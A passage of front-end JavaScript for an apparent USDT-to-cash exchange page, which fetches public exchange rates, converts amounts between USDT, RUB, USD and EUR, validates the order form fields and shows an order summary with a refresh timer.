        const response = await fetch(url);
        const data = await response.json();
        
        minEUR = ( ( minUSD * data.Valute.USD.Value ) / data.Valute.EUR.Value ).toFixed(0);
        maxEUR = ( ( maxUSD * data.Valute.USD.Value ) / data.Valute.EUR.Value ).toFixed(0);
        minRUB = ( ( minUSD * data.Valute.USD.Value ) ).toFixed(0);
        maxRUB = ( ( maxUSD * data.Valute.USD.Value ) ).toFixed(0);
        minUSDT = ( minUSD * ( PRICE_USDT ) ).toFixed(0);
        maxUSDT = ( maxUSD * ( PRICE_USDT ) ).toFixed(0);

        document.querySelector('.cash__first-input').placeholder = `${addSpaces(minUSDT)} - ${addSpaces(maxUSDT)} USDT`;
        document.querySelector('.cash__second-input').placeholder = `${addSpaces(minRUB)} - ${addSpaces(maxRUB)} RUB`;
    
    }

    getCurrencies();
    
}).catch((error) => {
    console.error('Ошибка получения списка: ', error);
})

function addSpaces(num) {
    return String(num).replace(/\B(?=(\d{3})+(?!\d))/g, " ");
}



let cashCity = 'Москва';
document.querySelector('.cash__select select').addEventListener('click', event => {
    cashCity = document.querySelector('.cash__select select').value;
    changeCashPage();
    document.querySelector('.cash__window').style.display = 'none';
})

function changeRateCash() {

    if ( cashFirstValute == 'Tether TRC20 (USDT)' ) {
        document.querySelector('.cash__first-input').placeholder = `${addSpaces(minUSDT)} - ${addSpaces(maxUSDT)} USDT`;
    } else if ( cashFirstValute == 'Наличные USD' ) {
        document.querySelector('.cash__first-input').placeholder = '1 000 - 100 000 USD';
    } else if ( cashFirstValute == 'Наличные EUR' ) {
        document.querySelector('.cash__first-input').placeholder = `${addSpaces(minEUR)} - ${addSpaces(maxEUR)} EUR`;
    } else if ( cashFirstValute == 'Наличные RUB' ) {
        document.querySelector('.cash__first-input').placeholder = `${addSpaces(minRUB)} - ${addSpaces(maxRUB)} RUB`;
    }

    if ( cashSecondValute == 'Tether TRC20 (USDT)' ) {
        document.querySelector('.cash__second-input').placeholder = `${addSpaces(minUSDT)} - ${addSpaces(maxUSDT)} USDT`;
    } else if ( cashSecondValute == 'Наличные USD' ) {
        document.querySelector('.cash__second-input').placeholder = '1 000 - 100 000 USD';
    } else if ( cashSecondValute == 'Наличные EUR' ) {
        document.querySelector('.cash__second-input').placeholder = `${addSpaces(minEUR)} - ${addSpaces(maxEUR)} EUR`;
    } else if ( cashSecondValute == 'Наличные RUB' ) {
        document.querySelector('.cash__second-input').placeholder = `${addSpaces(minRUB)} - ${addSpaces(maxRUB)} RUB`;
    }

}

function changeCashPage() {
    document.querySelector('.cash__title p').textContent = `Обменять ${cashFirstValute} на ${cashSecondValute} в г.${cashCity}`;
    changeRateCash();
}

document.querySelectorAll('.table-four__valute').forEach( (item, i) => {
    item.addEventListener('click', event => {
        whatValuteOnCash();
        document.querySelector('.cash__button').classList.add('cash__button-active');
        document.querySelector('.cash__load-button').style.display = 'block';
        setTimeout( () => {
            document.querySelector('.cash__button').classList.remove('cash__button-active');
            document.querySelector('.cash__load-button').style.display = 'none';
        }, 1200 )

        document.querySelector('.cash__window').style.display = 'none';
        document.querySelectorAll('.cash__name')[1].textContent = `Отдаете ${document.querySelectorAll('.table-four__valute p')[i].textContent}`;
        document.querySelectorAll('.cash__btn img')[0].src = document.querySelectorAll('.table-four__valute img')[i].src;
        cashFirstValute = document.querySelectorAll('.table-four__valute p')[i].textContent;

        document.querySelectorAll('.table-four__valute').forEach( (item, i) => {
            item.classList.remove('table-four__valute-active');
        })
        item.classList.add('table-four__valute-active');
        document.querySelector('.table-four').style.display = 'none';

        document.querySelector('.cash__first-input').style.background = 'none';
        activeCashFirstBtn = false;

        if ( document.querySelectorAll('.table-four__valute')[i].classList.value.includes('table-four__valute-cash') ) {
            cashSecondValute = 'Tether TRC20 (USDT)';
            document.querySelectorAll('.cash__name')[2].textContent = `Получаете Tether TRC20 (USDT)`;
            document.querySelector('.cash__reserv').textContent = 'Резерв: 200 000 USDT';
            document.querySelectorAll('.cash__btn img')[1].src = document.querySelectorAll('.table-five__valute img')[0].src;

            document.querySelectorAll('.table-five__valute').forEach( item => {
                item.classList.remove('table-five__valute-active');
            })
            document.querySelectorAll('.table-five__valute')[0].classList.add('table-five__valute-active');

            document.querySelectorAll('.table-five__valute').forEach( item => {
                item.style.display = 'none';
            })
            document.querySelectorAll('.table-five__valute')[0].style.display = 'flex';

            document.querySelectorAll('.table-five__button')[1].style.display = 'flex';
            document.querySelectorAll('.table-five__button')[2].style.display = 'none';
        } else {
            cashSecondValute = 'Наличные RUB';
            document.querySelectorAll('.cash__name')[2].textContent = `Получаете Наличные RUB`;
            document.querySelector('.cash__reserv').textContent = 'Резерв: 17 810 235 RUB';
            document.querySelectorAll('.cash__btn img')[1].src = document.querySelectorAll('.table-five__valute img')[1].src;

            document.querySelectorAll('.table-five__valute').forEach( item => {
                item.classList.remove('table-five__valute-active');
            })
            document.querySelectorAll('.table-five__valute')[1].classList.add('table-five__valute-active');

            document.querySelectorAll('.table-five__valute').forEach( item => {
                item.style.display = 'none';
            })
            document.querySelectorAll('.table-five__valute')[1].style.display = 'flex';
            document.querySelectorAll('.table-five__valute')[2].style.display = 'flex';
            document.querySelectorAll('.table-five__valute')[3].style.display = 'flex';

            document.querySelectorAll('.table-five__button')[1].style.display = 'none';
            document.querySelectorAll('.table-five__button')[2].style.display = 'flex';
        }

        changeCashPage();

    })
})

document.querySelectorAll('.table-five__valute').forEach( (item, i) => {
    item.addEventListener('click', event => {

        whatValuteOnCash();

        document.querySelector('.cash__button').classList.add('cash__button-active');
        document.querySelector('.cash__load-button').style.display = 'block';
        setTimeout( () => {
            document.querySelector('.cash__button').classList.remove('cash__button-active');
            document.querySelector('.cash__load-button').style.display = 'none';
        }, 1200 )

        document.querySelector('.cash__window').style.display = 'none';
        
        document.querySelectorAll('.cash__name')[2].textContent = `Получаете ${document.querySelectorAll('.table-five__valute p')[i].textContent}`;
        document.querySelectorAll('.cash__btn img')[1].src = document.querySelectorAll('.table-five__valute img')[i].src;
        cashSecondValute = document.querySelectorAll('.table-five__valute p')[i].textContent;

        document.querySelectorAll('.table-five__valute').forEach( (item, i) => {
            item.classList.remove('table-five__valute-active');
        })
        item.classList.add('table-five__valute-active');
        document.querySelector('.table-five').style.display = 'none';

        document.querySelector('.cash__second-input').style.background = 'none';
        activeCashSecondBtn = false;

        document.querySelector('.cash__reserv').textContent = document.querySelectorAll('.table-five__reserv')[i].textContent;

        changeCashPage();

    })
})

document.querySelector('.cash__open-window').addEventListener('click', event => {
    document.querySelector('.cash__window').style.display = 'block';
})

document.querySelector('.cash__window svg').addEventListener('click', event => {
    document.querySelector('.cash__window').style.display = 'none';
})

// Обработка первого инпута

document.querySelector('.cash__first-input').addEventListener('input', event => {

    document.querySelectorAll('.cash__gif')[0].style.display = 'block';
    document.querySelectorAll('.cash__gif')[1].style.display = 'block';

    document.querySelectorAll('.cash__message')[0].style.display = 'none';
    document.querySelectorAll('.cash__area')[0].style.border = '2px solid #000';
    document.querySelector('.cash__get').style.marginBottom = '20px';

    fetch('https://api.exmo.com/v1/ticker/').then(async(result) => {
        if (result.status === 200 && result.ok) {
            return result.json()
        }
    }).then((JSON_DATA) => {
        async function getCurrencies(){  
            const url = 'https://www.cbr-xml-daily.ru/daily_json.js';
            const response = await fetch(url);
            const data = await response.json();
            
            if ( cashFirstValute == 'Tether TRC20 (USDT)' ) {
                if ( cashSecondValute == 'Наличные RUB' ) {
                    document.querySelector('.cash__second-input').value =  ( Number(document.querySelector('.cash__first-input').value) * ( data.Valute.USD.Value / PRICE_USDT ) ).toFixed(0) ;
                } else if ( cashSecondValute == 'Наличные USD' ) {
                    document.querySelector('.cash__second-input').value = ( Number(document.querySelector('.cash__first-input').value) / PRICE_USDT ).toFixed(0) ;
                } else if ( cashSecondValute == 'Наличные EUR' ) {
                    document.querySelector('.cash__second-input').value = ( ( ( ( Number(document.querySelector('.cash__first-input').value) / PRICE_USDT ) * data.Valute.EUR.Value ) / PRICE_USDT ) / 101.28 ).toFixed(0) ;
                }
            } else if ( cashFirstValute == 'Наличные RUB' ) {
                document.querySelector('.cash__second-input').value = ( ( Number(document.querySelector('.cash__first-input').value) * PRICE_USDT ) / data.Valute.USD.Value ).toFixed(0);
            } else if ( cashFirstValute == 'Наличные USD' ) {
                document.querySelector('.cash__second-input').value = ( Number(document.querySelector('.cash__first-input').value) * PRICE_USDT ).toFixed(0);
            } else if ( cashFirstValute == 'Наличные EUR' ) {
                document.querySelector('.cash__second-input').value = ( ( ( ( Number(document.querySelector('.cash__first-input').value) * data.Valute.EUR.Value ) / PRICE_USDT ) / data.Valute.USD.Value ) * 1.0816 ).toFixed(0);
            }

            if ( cashFirstValute == 'Tether TRC20 (USDT)' ) {
                if ( Number(document.querySelector('.cash__first-input').value) < minUSDT ) {
                    document.querySelectorAll('.cash__message')[0].style.display = 'block';
                    document.querySelectorAll('.cash__message p')[0].textContent = `Сумма должна быть больше ${minUSDT}`;
                    document.querySelectorAll('.cash__area')[0].style.border = '2px solid #f73';
                    document.querySelector('.cash__get').style.marginBottom = '30px';
                } else if ( Number(document.querySelector('.cash__first-input').value) > maxUSDT ) {
                    document.querySelectorAll('.cash__message')[0].style.display = 'block';
                    document.querySelectorAll('.cash__message p')[0].textContent = `Сумма должна быть меньше ${maxUSDT}`;
                    document.querySelectorAll('.cash__area')[0].style.border = '2px solid #f73';
                    document.querySelector('.cash__get').style.marginBottom = '30px';
                }
            } else if ( cashFirstValute == 'Наличные RUB' ) {
                if ( Number(document.querySelector('.cash__first-input').value) < minRUB ) {
                    document.querySelectorAll('.cash__message')[0].style.display = 'block';
                    document.querySelectorAll('.cash__message p')[0].textContent = `Сумма должна быть больше ${minRUB}`;
                    document.querySelectorAll('.cash__area')[0].style.border = '2px solid #f73';
                    document.querySelector('.cash__get').style.marginBottom = '30px';
                } else if ( Number(document.querySelector('.cash__first-input').value) > maxRUB ) {
                    document.querySelectorAll('.cash__message')[0].style.display = 'block';
                    document.querySelectorAll('.cash__message p')[0].textContent = `Сумма должна быть меньше ${maxRUB}`;
                    document.querySelectorAll('.cash__area')[0].style.border = '2px solid #f73';
                    document.querySelector('.cash__get').style.marginBottom = '30px';
                }
            } else if ( cashFirstValute == 'Наличные USD' ) {
                if ( Number(document.querySelector('.cash__first-input').value) < minUSD ) {
                    document.querySelectorAll('.cash__message')[0].style.display = 'block';
                    document.querySelectorAll('.cash__message p')[0].textContent = `Сумма должна быть больше ${minUSD}`;
                    document.querySelectorAll('.cash__area')[0].style.border = '2px solid #f73';
                    document.querySelector('.cash__get').style.marginBottom = '30px';
                } else if ( Number(document.querySelector('.cash__first-input').value) > maxUSD ) {
                    document.querySelectorAll('.cash__message')[0].style.display = 'block';
                    document.querySelectorAll('.cash__message p')[0].textContent = `Сумма должна быть меньше ${maxUSD}`;
                    document.querySelectorAll('.cash__area')[0].style.border = '2px solid #f73';
                    document.querySelector('.cash__get').style.marginBottom = '30px';
                }
            } else if ( cashFirstValute == 'Наличные EUR' ) {
                if ( Number(document.querySelector('.cash__first-input').value) < minEUR ) {
                    document.querySelectorAll('.cash__message')[0].style.display = 'block';
                    document.querySelectorAll('.cash__message p')[0].textContent = `Сумма должна быть больше ${minEUR}`;
                    document.querySelectorAll('.cash__area')[0].style.border = '2px solid #f73';
                    document.querySelector('.cash__get').style.marginBottom = '30px';
                } else if ( Number(document.querySelector('.cash__first-input').value) > maxEUR ) {
                    document.querySelectorAll('.cash__message')[0].style.display = 'block';
                    document.querySelectorAll('.cash__message p')[0].textContent = `Сумма должна быть меньше ${maxEUR}`;
                    document.querySelectorAll('.cash__area')[0].style.border = '2px solid #f73';
                    document.querySelector('.cash__get').style.marginBottom = '30px';
                }
            }

            if ( document.querySelector('.cash__first-input').value == '' ) {
                document.querySelector('.cash__second-input').value = '';
                document.querySelectorAll('.cash__message')[0].style.display = 'none';
                document.querySelectorAll('.cash__area')[0].style.border = '2px solid #000';
                document.querySelector('.cash__get').style.marginBottom = '20px';
            }

            setTimeout( () => {
                document.querySelectorAll('.cash__gif')[0].style.display = 'none';
                document.querySelectorAll('.cash__gif')[1].style.display = 'none';
            }, 1000 )
        
        }
        getCurrencies();

    }).catch((error) => {
        console.error('Ошибка получения списка: ', error);
    })

})

// Обработка второго инпута

document.querySelector('.cash__second-input').addEventListener('input', event => {

    document.querySelectorAll('.cash__gif')[0].style.display = 'block';
    document.querySelectorAll('.cash__gif')[1].style.display = 'block';

    document.querySelectorAll('.cash__message')[1].style.display = 'none';
    document.querySelectorAll('.cash__area')[1].style.border = '2px solid #000';
    document.querySelector('.cash__take').style.marginBottom = '20px';

    fetch('https://api.exmo.com/v1/ticker/').then(async(result) => {
        if (result.status === 200 && result.ok) {
            return result.json()
        }
    }).then((JSON_DATA) => {
        async function getCurrencies(){  
            const url = 'https://www.cbr-xml-daily.ru/daily_json.js';
            const response = await fetch(url);
            const data = await response.json();
            
            if ( cashSecondValute == 'Наличные RUB' ) {
                document.querySelector('.cash__first-input').value = ( ( Number(document.querySelector('.cash__second-input').value) * PRICE_USDT ) / data.Valute.USD.Value ).toFixed(0);
            } else if ( cashSecondValute == 'Наличные USD' ) {
                document.querySelector('.cash__first-input').value = ( Number(document.querySelector('.cash__second-input').value) * PRICE_USDT ).toFixed(0);
            } else if ( cashSecondValute == 'Наличные EUR' ) {
                document.querySelector('.cash__first-input').value = ( ( ( ( Number(document.querySelector('.cash__second-input').value) * data.Valute.EUR.Value ) / PRICE_USDT ) / data.Valute.USD.Value ) * 1.0816 ).toFixed(0);
            } else if ( cashSecondValute == 'Tether TRC20 (USDT)' ) {
                if ( cashFirstValute == 'Наличные RUB' ) {
                    document.querySelector('.cash__first-input').value =  ( Number(document.querySelector('.cash__second-input').value) * ( data.Valute.USD.Value / PRICE_USDT ) ).toFixed(0) ;
                } else if ( cashFirstValute == 'Наличные USD' ) {
                    document.querySelector('.cash__first-input').value = ( Number(document.querySelector('.cash__second-input').value) / PRICE_USDT ).toFixed(0) ;
                } else if ( cashFirstValute == 'Наличные EUR' ) {
                    document.querySelector('.cash__first-input').value = ( ( ( ( Number(document.querySelector('.cash__second-input').value) / PRICE_USDT ) * data.Valute.EUR.Value ) / PRICE_USDT ) / 101.28 ).toFixed(0) ;
                }
            }

            if ( cashSecondValute == 'Tether TRC20 (USDT)' ) {
                if ( Number(document.querySelector('.cash__second-input').value) < minUSDT ) {
                    document.querySelectorAll('.cash__message')[1].style.display = 'block';
                    document.querySelectorAll('.cash__message p')[1].textContent = `Сумма должна быть больше ${minUSDT}`;
                    document.querySelectorAll('.cash__area')[1].style.border = '2px solid #f73';
                    document.querySelector('.cash__take').style.marginBottom = '30px';
                } else if ( Number(document.querySelector('.cash__second-input').value) > maxUSDT ) {
                    document.querySelectorAll('.cash__message')[1].style.display = 'block';
                    document.querySelectorAll('.cash__message p')[1].textContent = `Сумма должна быть меньше ${maxUSDT}`;
                    document.querySelectorAll('.cash__area')[1].style.border = '2px solid #f73';
                    document.querySelector('.cash__take').style.marginBottom = '30px';
                }
            } else if ( cashSecondValute == 'Наличные RUB' ) {
                if ( Number(document.querySelector('.cash__second-input').value) < minRUB ) {
                    document.querySelectorAll('.cash__message')[1].style.display = 'block';
                    document.querySelectorAll('.cash__message p')[1].textContent = `Сумма должна быть больше ${minRUB}`;
                    document.querySelectorAll('.cash__area')[1].style.border = '2px solid #f73';
                    document.querySelector('.cash__take').style.marginBottom = '30px';
                } else if ( Number(document.querySelector('.cash__second-input').value) > maxRUB ) {
                    document.querySelectorAll('.cash__message')[1].style.display = 'block';
                    document.querySelectorAll('.cash__message p')[1].textContent = `Сумма должна быть меньше ${maxRUB}`;
                    document.querySelectorAll('.cash__area')[1].style.border = '2px solid #f73';
                    document.querySelector('.cash__take').style.marginBottom = '30px';
                }
            } else if ( cashSecondValute == 'Наличные USD' ) {
                if ( Number(document.querySelector('.cash__second-input').value) < minUSD ) {
                    document.querySelectorAll('.cash__message')[1].style.display = 'block';
                    document.querySelectorAll('.cash__message p')[1].textContent = `Сумма должна быть больше ${minUSD}`;
                    document.querySelectorAll('.cash__area')[1].style.border = '2px solid #f73';
                    document.querySelector('.cash__take').style.marginBottom = '30px';
                } else if ( Number(document.querySelector('.cash__second-input').value) > maxUSD ) {
                    document.querySelectorAll('.cash__message')[1].style.display = 'block';
                    document.querySelectorAll('.cash__message p')[1].textContent = `Сумма должна быть меньше ${maxUSD}`;
                    document.querySelectorAll('.cash__area')[1].style.border = '2px solid #f73';
                    document.querySelector('.cash__take').style.marginBottom = '30px';
                }
            } else if ( cashSecondValute == 'Наличные EUR' ) {
                if ( Number(document.querySelector('.cash__second-input').value) < minEUR ) {
                    document.querySelectorAll('.cash__message')[1].style.display = 'block';
                    document.querySelectorAll('.cash__message p')[1].textContent = `Сумма должна быть больше ${minEUR}`;
                    document.querySelectorAll('.cash__area')[1].style.border = '2px solid #f73';
                    document.querySelector('.cash__take').style.marginBottom = '30px';
                } else if ( Number(document.querySelector('.cash__second-input').value) > maxEUR ) {
                    document.querySelectorAll('.cash__message')[1].style.display = 'block';
                    document.querySelectorAll('.cash__message p')[1].textContent = `Сумма должна быть меньше ${maxEUR}`;
                    document.querySelectorAll('.cash__area')[1].style.border = '2px solid #f73';
                    document.querySelector('.cash__take').style.marginBottom = '30px';
                }
            }

            if ( document.querySelector('.cash__second-input').value == '' ) {
                document.querySelector('.cash__first-input').value = '';
                document.querySelectorAll('.cash__message')[1].style.display = 'none';
                document.querySelectorAll('.cash__area')[1].style.border = '2px solid #000';
                document.querySelector('.cash__take').style.marginBottom = '20px';
            }

            setTimeout( () => {
                document.querySelectorAll('.cash__gif')[0].style.display = 'none';
                document.querySelectorAll('.cash__gif')[1].style.display = 'none';
            }, 1000 )
        
        }
        getCurrencies();
    }).catch((error) => {
        console.error('Ошибка получения списка: ', error);
    })

})

let cashERROR = false;
document.querySelector('.cash__button').addEventListener('click', event => {
    if ( document.querySelector('.cash__button').classList.value.length == 12 ) {

        document.querySelector('.cash__hide').style.display = 'block';
        document.querySelector('.cash__bottom').classList.add('cash__bottom-active');

        cashERROR = false;
        // Проверка заполнения полей

        if ( cashFirstValute == 'Tether TRC20 (USDT)' ) {
            if ( Number(document.querySelector('.cash__first-input').value) < minUSDT ) {
                document.querySelectorAll('.cash__message')[0].style.display = 'block';
                document.querySelectorAll('.cash__message p')[0].textContent = `Сумма должна быть больше ${minUSDT}`;
                document.querySelectorAll('.cash__area')[0].style.border = '2px solid #f73';
                document.querySelector('.cash__get').style.marginBottom = '30px';
                cashERROR = true;
            } else if ( Number(document.querySelector('.cash__first-input').value) > maxUSDT ) {
                document.querySelectorAll('.cash__message')[0].style.display = 'block';
                document.querySelectorAll('.cash__message p')[0].textContent = `Сумма должна быть меньше ${maxUSDT}`;
                document.querySelectorAll('.cash__area')[0].style.border = '2px solid #f73';
                document.querySelector('.cash__get').style.marginBottom = '30px';
                cashERROR = true;
            }
        } else if ( cashFirstValute == 'Наличные RUB' ) {
            if ( Number(document.querySelector('.cash__first-input').value) < minRUB ) {
                document.querySelectorAll('.cash__message')[0].style.display = 'block';
                document.querySelectorAll('.cash__message p')[0].textContent = `Сумма должна быть больше ${minRUB}`;
                document.querySelectorAll('.cash__area')[0].style.border = '2px solid #f73';
                document.querySelector('.cash__get').style.marginBottom = '30px';
                cashERROR = true;
            } else if ( Number(document.querySelector('.cash__first-input').value) > maxRUB ) {
                document.querySelectorAll('.cash__message')[0].style.display = 'block';
                document.querySelectorAll('.cash__message p')[0].textContent = `Сумма должна быть меньше ${maxRUB}`;
                document.querySelectorAll('.cash__area')[0].style.border = '2px solid #f73';
                document.querySelector('.cash__get').style.marginBottom = '30px';
                cashERROR = true;
            }
        } else if ( cashFirstValute == 'Наличные USD' ) {
            if ( Number(document.querySelector('.cash__first-input').value) < minUSD ) {
                document.querySelectorAll('.cash__message')[0].style.display = 'block';
                document.querySelectorAll('.cash__message p')[0].textContent = `Сумма должна быть больше ${minUSD}`;
                document.querySelectorAll('.cash__area')[0].style.border = '2px solid #f73';
                document.querySelector('.cash__get').style.marginBottom = '30px';
                cashERROR = true;
            } else if ( Number(document.querySelector('.cash__first-input').value) > maxUSD ) {
                document.querySelectorAll('.cash__message')[0].style.display = 'block';
                document.querySelectorAll('.cash__message p')[0].textContent = `Сумма должна быть меньше ${maxUSD}`;
                document.querySelectorAll('.cash__area')[0].style.border = '2px solid #f73';
                document.querySelector('.cash__get').style.marginBottom = '30px';
                cashERROR = true;
            }
        } else if ( cashFirstValute == 'Наличные EUR' ) {
            if ( Number(document.querySelector('.cash__first-input').value) < minEUR ) {
                document.querySelectorAll('.cash__message')[0].style.display = 'block';
                document.querySelectorAll('.cash__message p')[0].textContent = `Сумма должна быть больше ${minEUR}`;
                document.querySelectorAll('.cash__area')[0].style.border = '2px solid #f73';
                document.querySelector('.cash__get').style.marginBottom = '30px';
                cashERROR = true;
            } else if ( Number(document.querySelector('.cash__first-input').value) > maxEUR ) {
                document.querySelectorAll('.cash__message')[0].style.display = 'block';
                document.querySelectorAll('.cash__message p')[0].textContent = `Сумма должна быть меньше ${maxEUR}`;
                document.querySelectorAll('.cash__area')[0].style.border = '2px solid #f73';
                document.querySelector('.cash__get').style.marginBottom = '30px';
                cashERROR = true;
            }
        }

        if ( cashSecondValute == 'Tether TRC20 (USDT)' ) {
            if ( Number(document.querySelector('.cash__second-input').value) < minUSDT ) {
                document.querySelectorAll('.cash__message')[1].style.display = 'block';
                document.querySelectorAll('.cash__message p')[1].textContent = `Сумма должна быть больше ${minUSDT}`;
                document.querySelectorAll('.cash__area')[1].style.border = '2px solid #f73';
                document.querySelector('.cash__take').style.marginBottom = '30px';
                cashERROR = true;
            } else if ( Number(document.querySelector('.cash__second-input').value) > maxUSDT ) {
                document.querySelectorAll('.cash__message')[1].style.display = 'block';
                document.querySelectorAll('.cash__message p')[1].textContent = `Сумма должна быть меньше ${maxUSDT}`;
                document.querySelectorAll('.cash__area')[1].style.border = '2px solid #f73';
                document.querySelector('.cash__take').style.marginBottom = '30px';
                cashERROR = true;
            }
        } else if ( cashSecondValute == 'Наличные RUB' ) {
            if ( Number(document.querySelector('.cash__second-input').value) < minRUB ) {
                document.querySelectorAll('.cash__message')[1].style.display = 'block';
                document.querySelectorAll('.cash__message p')[1].textContent = `Сумма должна быть больше ${minRUB}`;
                document.querySelectorAll('.cash__area')[1].style.border = '2px solid #f73';
                document.querySelector('.cash__take').style.marginBottom = '30px';
                cashERROR = true;
            } else if ( Number(document.querySelector('.cash__second-input').value) > maxRUB ) {
                document.querySelectorAll('.cash__message')[1].style.display = 'block';
                document.querySelectorAll('.cash__message p')[1].textContent = `Сумма должна быть меньше ${maxRUB}`;
                document.querySelectorAll('.cash__area')[1].style.border = '2px solid #f73';
                document.querySelector('.cash__take').style.marginBottom = '30px';
                cashERROR = true;
            }
        } else if ( cashSecondValute == 'Наличные USD' ) {
            if ( Number(document.querySelector('.cash__second-input').value) < minUSD ) {
                document.querySelectorAll('.cash__message')[1].style.display = 'block';
                document.querySelectorAll('.cash__message p')[1].textContent = `Сумма должна быть больше ${minUSD}`;
                document.querySelectorAll('.cash__area')[1].style.border = '2px solid #f73';
                document.querySelector('.cash__take').style.marginBottom = '30px';
                cashERROR = true;
            } else if ( Number(document.querySelector('.cash__second-input').value) > maxUSD ) {
                document.querySelectorAll('.cash__message')[1].style.display = 'block';
                document.querySelectorAll('.cash__message p')[1].textContent = `Сумма должна быть меньше ${maxUSD}`;
                document.querySelectorAll('.cash__area')[1].style.border = '2px solid #f73';
                document.querySelector('.cash__take').style.marginBottom = '30px';
                cashERROR = true;
            }
        } else if ( cashSecondValute == 'Наличные EUR' ) {
            if ( Number(document.querySelector('.cash__second-input').value) < minEUR ) {
                document.querySelectorAll('.cash__message')[1].style.display = 'block';
                document.querySelectorAll('.cash__message p')[1].textContent = `Сумма должна быть больше ${minEUR}`;
                document.querySelectorAll('.cash__area')[1].style.border = '2px solid #f73';
                document.querySelector('.cash__take').style.marginBottom = '30px';
                cashERROR = true;
            } else if ( Number(document.querySelector('.cash__second-input').value) > maxEUR ) {
                document.querySelectorAll('.cash__message')[1].style.display = 'block';
                document.querySelectorAll('.cash__message p')[1].textContent = `Сумма должна быть меньше ${maxEUR}`;
                document.querySelectorAll('.cash__area')[1].style.border = '2px solid #f73';
                document.querySelector('.cash__take').style.marginBottom = '30px';
                cashERROR = true;
            }
        }

        if ( document.querySelector('.cash__first-input').value == '' ) {
            document.querySelectorAll('.cash__message')[0].style.display = 'block';
            document.querySelectorAll('.cash__message p')[0].textContent = 'Поле не может быть пустым';
            document.querySelectorAll('.cash__area')[0].style.border = '2px solid #f73';
            document.querySelector('.cash__get').style.marginBottom = '30px';
            cashERROR = true;
        }

        if ( document.querySelector('.cash__second-input').value == '' ) {
            document.querySelectorAll('.cash__message')[1].style.display = 'block';
            document.querySelectorAll('.cash__message p')[1].textContent = 'Поле не может быть пустым';
            document.querySelectorAll('.cash__area')[1].style.border = '2px solid #f73';
            document.querySelector('.cash__take').style.marginBottom = '30px';
            cashERROR = true;
        }

        if ( document.querySelector('.cash__user-input').value == '' ) {
            document.querySelectorAll('.cash__message')[2].style.display = 'block';
            document.querySelectorAll('.cash__message p')[2].textContent = 'Поле не может быть пустым';
            document.querySelector('.cash__user-input').style.border = '2px solid #f73';
            document.querySelector('.cash__user').style.marginBottom = '30px';
            cashERROR = true;
        }

        if ( document.querySelector('.cash__email-input').value == '' ) {
            document.querySelectorAll('.cash__message')[3].style.display = 'block';
            document.querySelectorAll('.cash__message p')[3].textContent = 'Поле не может быть пустым';
            document.querySelector('.cash__email-input').style.border = '2px solid #f73';
            document.querySelector('.cash__email').style.marginBottom = '30px';
            cashERROR = true;
        } else if ( !String(document.querySelector('.cash__email-input').value).includes('@') || !String(document.querySelector('.cash__email-input').value).includes('.') || String(document.querySelector('.cash__email-input').value).length < 6 ) {
            document.querySelectorAll('.cash__message')[3].style.display = 'block';
            document.querySelectorAll('.cash__message p')[3].textContent = 'Не верный E-mail';
            document.querySelector('.cash__email-input').style.border = '2px solid #f73';
            document.querySelector('.cash__email').style.marginBottom = '30px';
            cashERROR = true;
        }

        if ( document.querySelector('.cash__contact-input').value == '' ) {
            document.querySelectorAll('.cash__message')[4].style.display = 'block';
            document.querySelectorAll('.cash__message p')[4].textContent = 'Поле не может быть пустым';
            document.querySelector('.cash__contact-input').style.border = '2px solid #f73';
            document.querySelector('.cash__contact').style.marginBottom = '30px';
            cashERROR = true;
        } else if ( document.querySelector('.cash__contact-input').value.length < 5 ) {
            document.querySelectorAll('.cash__message')[4].style.display = 'block';
            document.querySelectorAll('.cash__message p')[4].textContent = 'Укажите Ваш телефон или telegram';
            document.querySelector('.cash__contact-input').style.border = '2px solid #f73';
            document.querySelector('.cash__contact').style.marginBottom = '30px';
            cashERROR = true;
        }

        if ( cashERROR == false ) {

            document.querySelector('.last__card h4').textContent = `Ваша заявка № ${orderID}`;

            document.querySelectorAll('.last__line p')[0].textContent = cashFirstValute;
            document.querySelectorAll('.last__line p')[2].textContent = cashSecondValute;

            document.querySelectorAll('.last__line img')[0].src = document.querySelectorAll('.cash__btn img')[0].src;
            document.querySelectorAll('.last__line img')[1].src = document.querySelectorAll('.cash__btn img')[1].src;

            if ( cashFirstValute == 'Tether TRC20 (USDT)' ) {
                document.querySelectorAll('.last__line p')[1].textContent = `${document.querySelector('.cash__first-input').value} USDT`;
            } else if ( cashFirstValute == 'Наличные RUB' ) {
                document.querySelectorAll('.last__line p')[1].textContent = `${document.querySelector('.cash__first-input').value} RUB`;
            } else if ( cashFirstValute == 'Наличные USD' ) {
                document.querySelectorAll('.last__line p')[1].textContent = `${document.querySelector('.cash__first-input').value} USD`;
            } else if ( cashFirstValute == 'Наличные EUR' ) {
                document.querySelectorAll('.last__line p')[1].textContent = `${document.querySelector('.cash__first-input').value} EUR`;
            }

            if ( cashSecondValute == 'Tether TRC20 (USDT)' ) {
                document.querySelectorAll('.last__line p')[3].textContent = `${document.querySelector('.cash__second-input').value} USDT`;
            } else if ( cashSecondValute == 'Наличные RUB' ) {
                document.querySelectorAll('.last__line p')[3].textContent = `${document.querySelector('.cash__second-input').value} RUB`;
            } else if ( cashSecondValute == 'Наличные USD' ) {
                document.querySelectorAll('.last__line p')[3].textContent = `${document.querySelector('.cash__second-input').value} USD`;
            } else if ( cashSecondValute == 'Наличные EUR' ) {
                document.querySelectorAll('.last__line p')[3].textContent = `${document.querySelector('.cash__second-input').value} EUR`;
            }

            document.querySelectorAll('.cash__load').forEach( item => {
                item.style.display = 'block';
            })
            document.querySelectorAll('.cash__val').forEach( item => {
                item.style.opacity = 0;
            })
            document.querySelector('.cash__button').classList.add('cash__button-active');
            document.querySelector('.cash__load-button').style.display = 'block';

            setTimeout( () => {
                document.querySelector('.change').style.display = 'none';
                document.querySelector('.last').style.display = 'block';
                document.title = 'Сделка';
            }, 2200 )

        }


    }
})

let secondsCashTimer = 30;

setInterval( () => {

    if ( secondsCashTimer >= 10 ) {
        document.querySelector('.cash__timer').textContent = `00:${secondsCashTimer}`;
    } else if ( secondsCashTimer < 10 && secondsCashTimer >= 0 ) {
        document.querySelector('.cash__timer').textContent = `00:0${secondsCashTimer}`;
    } else if ( secondsCashTimer == -1 ) {
        whatValuteOnCash();
        document.querySelector('.cash__button').classList.add('cash__button-active');
        document.querySelector('.cash__load-button').style.display = 'block';
        setTimeout( () => {
            document.querySelector('.cash__button').classList.remove('cash__button-active');
            document.querySelector('.cash__load-button').style.display = 'none';
        }, 1200 )
    }

    secondsCashTimer = secondsCashTimer - 1;

}, 1000 )

function whatValuteOnCash() {
    secondsCashTimer = 30;

    

    fetch('https://api.exmo.com/v1/ticker/').then(async(result) => {
